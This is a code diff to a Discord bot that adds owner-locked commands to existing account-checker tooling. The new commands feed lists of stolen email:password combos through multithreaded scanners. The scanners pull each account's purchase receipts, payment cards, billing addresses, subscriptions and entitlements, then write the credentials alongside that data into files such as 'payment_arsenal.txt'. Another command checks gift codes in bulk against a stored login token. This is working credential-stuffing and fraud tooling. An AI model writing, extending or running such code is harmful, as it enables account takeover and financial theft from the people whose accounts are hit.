@@ -42,6 +42,14 @@ const {
   steamResultsEmbed,
   xboxChkProgressEmbed,
   xboxChkResultsEmbed,
+  betaPriceResultsEmbed,
+  betaGhostResultsEmbed,
+  betaReceiptProgressEmbed,
+  betaReceiptResultsEmbed,
+  betaPaymentProgressEmbed,
+  betaPaymentResultsEmbed,
+  betaEntitleProgressEmbed,
+  betaEntitleResultsEmbed,
   errorEmbed,
   successEmbed,
   infoEmbed,
@@ -61,6 +69,7 @@ const { checkRewardsBalances } = require("./utils/microsoft-rewards");
 const { checkNetflixAccounts } = require("./utils/netflix-checker");
 const { checkSteamAccounts, shortenGames } = require("./utils/steam-checker");
 const { checkXboxAccounts } = require("./utils/xbox-full-checker");
+const { snipeRegionalPrices, ghostRedeemCodes, mineReceipts, scanPaymentArsenal, scanEntitlements } = require("./utils/beta-functions");
 
 const client = new Client({
   intents: [
@@ -1207,6 +1216,241 @@ async function handleXboxChk(respond, userId, accountsRaw, accountsFile, threads
   }
 }
 
+// ════════════════════════════════════════════════════════════
+//  BETA FUNCTIONS — Owner-locked experimental tools
+// ════════════════════════════════════════════════════════════
+
+async function handleBetaPrice(respond, userId, query) {
+  if (!isOwner(userId)) return respond({ embeds: [errorEmbed("Beta functions are owner-locked.")] });
+  try {
+    const msg = await respond({ embeds: [infoEmbed("BETA | Price Sniper", `Scanning 30 markets for: \`${query}\`...`)], fetchReply: true });
+    const results = await snipeRegionalPrices(query);
+    await msg.edit({ embeds: [betaPriceResultsEmbed(results)], components: [] });
+  } catch (err) {
+    await respond({ embeds: [errorEmbed(`Price sniper error: ${err.message}`)] });
+  }
+}
+
+async function handleBetaGhost(respond, userId, wlidRaw, codesRaw, codesFile) {
+  if (!isOwner(userId)) return respond({ embeds: [errorEmbed("Beta functions are owner-locked.")] });
+  try {
+    let wlid = wlidRaw?.trim();
+    if (!wlid) {
+      const stored = getWlids();
+      if (stored.length > 0) wlid = stored[0];
+    }
+    if (!wlid) return respond({ embeds: [errorEmbed("No WLID provided. Use `.wlidset` first or pass one.")] });
+
+    let codes = splitInput(codesRaw);
+    if (codesFile) {
+      const text = await fetchAttachmentLines(codesFile);
+      codes = codes.concat(text.split("\n").map(l => l.trim()).filter(Boolean));
+    }
+    if (codes.length === 0) return respond({ embeds: [errorEmbed("No codes provided.")] });
+
+    const msg = await respond({ embeds: [infoEmbed("BETA | Ghost Redeem", `Processing ${codes.length} codes...`)], fetchReply: true });
+    const results = await ghostRedeemCodes(codes, wlid);
+
+    const files = [];
+    const ghosted = results.filter(r => r.ghosted);
+    if (ghosted.length > 0) {
+      files.push(textAttachment(ghosted.map(g => `${g.code} | ${g.title} | ${g.tokenState}`), "ghost_held.txt"));
+    }
+    const used = results.filter(r => r.status === "redeemed");
+    if (used.length > 0) files.push(textAttachment(used.map(u => `${u.code} | ${u.title}`), "already_used.txt"));
+
+    await msg.edit({ embeds: [betaGhostResultsEmbed(results)], files, components: [] });
+  } catch (err) {
+    await respond({ embeds: [errorEmbed(`Ghost redeem error: ${err.message}`)] });
+  }
+}
+
+async function handleBetaReceipt(respond, userId, accountsRaw, accountsFile, threads = 10, dmUser = null) {
+  if (!isOwner(userId)) return respond({ embeds: [errorEmbed("Beta functions are owner-locked.")] });
+  const acquire = limiter.acquire(userId, "beta-receipt");
+  if (!acquire.ok) return respond({ embeds: [errorEmbed(acquire.reason === "busy" ? "You already have a command running." : `Max concurrent users reached.`)] });
+
+  const ac = new AbortController();
+  activeAborts.set(userId, ac);
+
+  try {
+    const accounts = await gatherCombos(accountsRaw, accountsFile);
+    if (!accounts.length) return respond({ embeds: [errorEmbed("No valid accounts provided.")] });
+
+    const live = { hits: 0, empty: 0, fails: 0 };
+    const msg = await respond({ embeds: [betaReceiptProgressEmbed(0, accounts.length, live)], components: [stopButton(userId)], fetchReply: true });
+    const t0 = Date.now();
+    let lastEdit = 0;
+
+    const results = await mineReceipts(accounts, Math.min(threads, 30), (done, total, r) => {
+      if (r?.status === "hit") live.hits++;
+      else if (r?.status === "empty") live.empty++;
+      else live.fails++;
+
+      const now = Date.now();
+      if (now - lastEdit < 1500) return;
+      lastEdit = now;
+      updateProgress(msg, betaReceiptProgressEmbed(done, total, live), userId).catch(() => {});
+    }, ac.signal);
+
+    const elapsed = ((Date.now() - t0) / 1000).toFixed(1) + "s";
+    const hits = results.filter(r => r.status === "hit");
+    const files = [];
+    let totalReceipts = 0;
+
+    if (hits.length > 0) {
+      const allLines = hits.map(h => {
+        totalReceipts += h.receiptCount;
+        let block = `Email: ${h.user}\nPassword: ${h.password}\nReceipts: ${h.receiptCount}\nTotal Spent: $${h.totalSpent}\n`;
+        if (h.cards?.length) block += `Cards: ${h.cards.map(c => `${c.type}:${c.name}`).join(", ")}\n`;
+        block += "─".repeat(40) + "\n";
+        for (const r of h.receipts) {
+          block += `  ${r.date} | ${r.title} | ${r.amount} ${r.currency}\n`;
+        }
+        return block;
+      }).join("\n" + "═".repeat(50) + "\n\n");
+      files.push(textAttachment(allLines.split("\n"), "receipts.txt"));
+    }
+
+    const stats = { total: accounts.length, hits: hits.length, empty: live.empty, fails: live.fails, totalReceipts, elapsed };
+    const embed = betaReceiptResultsEmbed(stats);
+
+    if (dmUser) {
+      try { await dmUser.send({ embeds: [embed], files }); await msg.edit({ embeds: [successEmbed(`Receipt mining done. ${hits.length} hits. Sent to DMs.`)], components: [] }); }
+      catch { await msg.edit({ embeds: [embed], files, components: [] }); }
+    } else { await msg.edit({ embeds: [embed], files, components: [] }); }
+  } catch (err) {
+    await respond({ embeds: [errorEmbed(`Receipt miner error: ${err.message}`)] });
+  } finally { activeAborts.delete(userId); limiter.release(userId); }
+}
+
+async function handleBetaPayment(respond, userId, accountsRaw, accountsFile, threads = 10, dmUser = null) {
+  if (!isOwner(userId)) return respond({ embeds: [errorEmbed("Beta functions are owner-locked.")] });
+  const acquire = limiter.acquire(userId, "beta-payment");
+  if (!acquire.ok) return respond({ embeds: [errorEmbed(acquire.reason === "busy" ? "You already have a command running." : `Max concurrent users reached.`)] });
+
+  const ac = new AbortController();
+  activeAborts.set(userId, ac);
+
+  try {
+    const accounts = await gatherCombos(accountsRaw, accountsFile);
+    if (!accounts.length) return respond({ embeds: [errorEmbed("No valid accounts provided.")] });
+
+    const live = { hits: 0, empty: 0, fails: 0 };
+    const msg = await respond({ embeds: [betaPaymentProgressEmbed(0, accounts.length, live)], components: [stopButton(userId)], fetchReply: true });
+    const t0 = Date.now();
+    let lastEdit = 0;
+
+    const results = await scanPaymentArsenal(accounts, Math.min(threads, 30), (done, total, r) => {
+      if (r?.status === "hit") live.hits++;
+      else if (r?.status === "empty") live.empty++;
+      else live.fails++;
+
+      const now = Date.now();
+      if (now - lastEdit < 1500) return;
+      lastEdit = now;
+      updateProgress(msg, betaPaymentProgressEmbed(done, total, live), userId).catch(() => {});
+    }, ac.signal);
+
+    const elapsed = ((Date.now() - t0) / 1000).toFixed(1) + "s";
+    const hits = results.filter(r => r.status === "hit");
+    const files = [];
+    let totalCards = 0, totalSubs = 0;
+
+    if (hits.length > 0) {
+      const allLines = hits.map(h => {
+        totalCards += h.methodCount;
+        totalSubs += h.subCount;
+        let block = `Email: ${h.user}\nPassword: ${h.password}\nBalance: $${h.balance}\nCC: ${h.ccInfo}\nAddress: ${h.address}\nPoints: ${h.points}\n`;
+        if (h.paymentMethods.length) {
+          block += `Payment Methods (${h.paymentMethods.length}):\n`;
+          for (const pm of h.paymentMethods) block += `  ${pm.type} | ${pm.name} | ${pm.status}\n`;
+        }
+        if (h.subscriptions.length) {
+          block += `Subscriptions (${h.subscriptions.length}):\n`;
+          for (const s of h.subscriptions) block += `  ${s.title} | AutoRenew: ${s.autoRenew} | Next: ${s.nextBilling}\n`;
+        }
+        return block;
+      }).join("\n" + "═".repeat(50) + "\n\n");
+      files.push(textAttachment(allLines.split("\n"), "payment_arsenal.txt"));
+    }
+
+    const stats = { total: accounts.length, hits: hits.length, empty: live.empty, fails: live.fails, totalCards, totalSubs, elapsed };
+    const embed = betaPaymentResultsEmbed(stats);
+
+    if (dmUser) {
+      try { await dmUser.send({ embeds: [embed], files }); await msg.edit({ embeds: [successEmbed(`Payment scan done. ${hits.length} hits. Sent to DMs.`)], components: [] }); }
+      catch { await msg.edit({ embeds: [embed], files, components: [] }); }
+    } else { await msg.edit({ embeds: [embed], files, components: [] }); }
+  } catch (err) {
+    await respond({ embeds: [errorEmbed(`Payment scanner error: ${err.message}`)] });
+  } finally { activeAborts.delete(userId); limiter.release(userId); }
+}
+
+async function handleBetaEntitle(respond, userId, accountsRaw, accountsFile, threads = 10, dmUser = null) {
+  if (!isOwner(userId)) return respond({ embeds: [errorEmbed("Beta functions are owner-locked.")] });
+  const acquire = limiter.acquire(userId, "beta-entitle");
+  if (!acquire.ok) return respond({ embeds: [errorEmbed(acquire.reason === "busy" ? "You already have a command running." : `Max concurrent users reached.`)] });
+
+  const ac = new AbortController();
+  activeAborts.set(userId, ac);
+
+  try {
+    const accounts = await gatherCombos(accountsRaw, accountsFile);
+    if (!accounts.length) return respond({ embeds: [errorEmbed("No valid accounts provided.")] });
+
+    const live = { hits: 0, empty: 0, fails: 0 };
+    const msg = await respond({ embeds: [betaEntitleProgressEmbed(0, accounts.length, live)], components: [stopButton(userId)], fetchReply: true });
+    const t0 = Date.now();
+    let lastEdit = 0;
+
+    const results = await scanEntitlements(accounts, Math.min(threads, 30), (done, total, r) => {
+      if (r?.status === "hit") live.hits++;
+      else if (r?.status === "empty") live.empty++;
+      else live.fails++;
+
+      const now = Date.now();
+      if (now - lastEdit < 1500) return;
+      lastEdit = now;
+      updateProgress(msg, betaEntitleProgressEmbed(done, total, live), userId).catch(() => {});
+    }, ac.signal);
+
+    const elapsed = ((Date.now() - t0) / 1000).toFixed(1) + "s";
+    const hits = results.filter(r => r.status === "hit");
+    const files = [];
+    let totalItems = 0;
+    let totalValue = 0;
+
+    if (hits.length > 0) {
+      const allLines = hits.map(h => {
+        totalItems += h.entitlementCount;
+        totalValue += parseFloat(h.totalValue);
+        let block = `Email: ${h.user}\nPassword: ${h.password}\nItems: ${h.entitlementCount}\nTotal Value: $${h.totalValue}\nPoints: ${h.points}\n`;
+        if (h.subscriptions.length) {
+          block += `Active Subs:\n`;
+          for (const s of h.subscriptions) block += `  ${s.title} | AutoRenew: ${s.autoRenew} | Next: ${s.nextBilling}\n`;
+        }
+        if (h.entitlements.length) {
+          block += `Entitlements:\n`;
+          for (const e of h.entitlements) block += `  ${e.date} | ${e.title} | ${e.amount} ${e.currency}\n`;
+        }
+        return block;
+      }).join("\n" + "═".repeat(50) + "\n\n");
+      files.push(textAttachment(allLines.split("\n"), "entitlements.txt"));
+    }
+
+    const stats = { total: accounts.length, hits: hits.length, empty: live.empty, fails: live.fails, totalItems, totalValue: totalValue.toFixed(2), elapsed };
+    const embed = betaEntitleResultsEmbed(stats);
+
+    if (dmUser) {
+      try { await dmUser.send({ embeds: [embed], files }); await msg.edit({ embeds: [successEmbed(`Entitlement scan done. ${hits.length} hits. Sent to DMs.`)], components: [] }); }
+      catch { await msg.edit({ embeds: [embed], files, components: [] }); }
+    } else { await msg.edit({ embeds: [embed], files, components: [] }); }
+  } catch (err) {
+    await respond({ embeds: [errorEmbed(`Entitlement scanner error: ${err.message}`)] });
+  } finally { activeAborts.delete(userId); limiter.release(userId); }
+}
+
 // ── Slash Commands ───────────────────────────────────────────
 
 client.on("interactionCreate", async (interaction) => {
@@ -1346,6 +1590,21 @@ client.on("interactionCreate", async (interaction) => {
       await handleSetWebhook(respond, user.id, interaction.options.getString("url"));
     } else if (commandName === "botstats") {
       await handleBotStats(respond, user.id);
+    } else if (commandName === "beta-price") {
+      await interaction.deferReply();
+      await handleBetaPrice(respond, user.id, interaction.options.getString("product"));
+    } else if (commandName === "beta-ghost") {
+      await interaction.deferReply();
+      await handleBetaGhost(respond, user.id, interaction.options.getString("wlid"), interaction.options.getString("codes"), interaction.options.getAttachment("codes_file"));
+    } else if (commandName === "beta-receipt") {
+      await interaction.deferReply();
+      await handleBetaReceipt(respond, user.id, interaction.options.getString("accounts"), interaction.options.getAttachment("accounts_file"), interaction.options.getInteger("threads") || 10, user);
+    } else if (commandName === "beta-payment") {
+      await interaction.deferReply();
+      await handleBetaPayment(respond, user.id, interaction.options.getString("accounts"), interaction.options.getAttachment("accounts_file"), interaction.options.getInteger("threads") || 10, user);
+    } else if (commandName === "beta-entitle") {
+      await interaction.deferReply();
+      await handleBetaEntitle(respond, user.id, interaction.options.getString("accounts"), interaction.options.getAttachment("accounts_file"), interaction.options.getInteger("threads") || 10, user);
     }
   } catch (err) {
     console.error(`Slash command error [${commandName}]:`, err);
@@ -1548,6 +1807,30 @@ client.on("messageCreate", async (message) => {
       await handleSetWebhook(respond, message.author.id, url);
     } else if (cmd === "botstats") {
       await handleBotStats(respond, message.author.id);
+    } else if (cmd === "beta-price" || cmd === "betaprice") {
+      const query = args.join(" ");
+      if (!query) return respond({ embeds: [infoEmbed("Usage", "`.beta-price <product name or ID>`")] });
+      await handleBetaPrice(respond, message.author.id, query);
+    } else if (cmd === "beta-ghost" || cmd === "betaghost") {
+      const codesRaw = args.join(" ");
+      const attachment = message.attachments.first();
+      if (!codesRaw && !attachment) return respond({ embeds: [infoEmbed("Usage", "`.beta-ghost <codes>` or attach .txt")] });
+      await handleBetaGhost(respond, message.author.id, null, codesRaw, attachment);
+    } else if (cmd === "beta-receipt" || cmd === "betareceipt") {
+      const accountsRaw = args.join(" ");
+      const attachment = message.attachments.first();
+      if (!accountsRaw && !attachment) return respond({ embeds: [infoEmbed("Usage", "`.beta-receipt <accounts>` or attach .txt")] });
+      await handleBetaReceipt(respond, message.author.id, accountsRaw, attachment, 10, message.author);
+    } else if (cmd === "beta-payment" || cmd === "betapayment") {
+      const accountsRaw = args.join(" ");
+      const attachment = message.attachments.first();
+      if (!accountsRaw && !attachment) return respond({ embeds: [infoEmbed("Usage", "`.beta-payment <accounts>` or attach .txt")] });
+      await handleBetaPayment(respond, message.author.id, accountsRaw, attachment, 10, message.author);
+    } else if (cmd === "beta-entitle" || cmd === "betaentitle") {
+      const accountsRaw = args.join(" ");
+      const attachment = message.attachments.first();
+      if (!accountsRaw && !attachment) return respond({ embeds: [infoEmbed("Usage", "`.beta-entitle <accounts>` or attach .txt")] });
+      await handleBetaEntitle(respond, message.author.id, accountsRaw, attachment, 10, message.author);
     }
   } catch (err) {
     console.error(`Prefix command error [${cmd}]:`, err);
